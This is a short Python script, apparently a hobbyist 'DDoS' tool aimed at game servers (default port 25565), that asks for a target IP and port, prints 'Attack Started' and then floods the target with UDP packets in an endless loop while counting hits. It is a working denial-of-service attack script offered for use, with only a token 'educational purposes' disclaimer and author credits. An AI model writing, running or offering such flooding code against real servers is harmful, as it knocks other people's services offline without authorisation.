import socket
import os
import sys
import time
os.system("clear")
print
print("""Warning!!!! This Script is not joke
and it is for educational purposes only, 
I'm not responsible for any damage caused 
by this script""")
time.sleep(7)
work = input("WILL YOU USE THIS SCRIPT ONLY FOR EDUCATIONAL PURPOSES  (Y/N)? >>  ")
os.system("clear")
print("""
MADE BY : RUPAM

GITHUB : github.com/iamrupambot
INSTAGRAM : https://instagram.com/iamrupambot

""")
time.sleep(4)
print("Insert The Target IP")
time.sleep(1)
ip = input('IP >> ')
print("Insert Port , Enter 0 for default port")
port = int(input('Port (Default: 25565) >> '))

if port == 0:

      port = 25565
print("Attack Started ☢️")
time.sleep(4)
print("Use CTRL+C to stop the Attack")
time.sleep(2)
h = 0
while True:
   h = h+1
   print("Total Hits --> ", h )
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

   s.connect((ip, port))

   i = 0

   if i < 10:

      s.send(b'\x01')
